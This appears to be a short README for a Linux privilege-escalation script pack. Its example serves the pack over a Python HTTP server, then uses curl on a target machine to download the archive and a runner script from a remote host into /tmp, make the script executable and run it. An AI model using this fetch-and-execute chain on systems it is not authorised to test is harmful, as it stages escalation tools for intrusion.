# Frist run
```bash
./DownloadLinuxPECScript.sh
```
And you will get `PE_Pack.tar.gz`.

# How to use?
Just run `RunLinuxPE.sh`.

# Simple Example
```bash
python3 -m http.server 
cd /tmp
curl http://null:8000/PE_Pack.tar.gz > PE_Pack.tar.gz 
curl http://null:8000/RunLinuxPE.sh > RunLinuxPE.sh && chmod u+x RunLinuxPE.sh && ./RunLinuxPE.sh
```